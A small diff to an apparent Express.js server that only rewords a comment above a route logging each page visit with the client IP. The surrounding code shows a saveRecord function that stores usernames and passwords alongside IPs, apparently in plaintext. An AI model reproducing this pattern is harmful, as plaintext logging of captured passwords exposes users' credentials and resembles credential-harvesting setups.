@@ -23,7 +23,7 @@ function saveRecord(type, username = null, password = null, ip = 'Unknown') {
         [type, username, password, ip, timestamp]);
 }
 
-// Record every visit immediately
+// Record visits
 app.get('/', (req, res) => {
     saveRecord('Page Visit', null, null, req.ip || req.headers['x-forwarded-for'] || 'Unknown');
     res.sendFile(path.join(__dirname, 'public', 'index.html'));
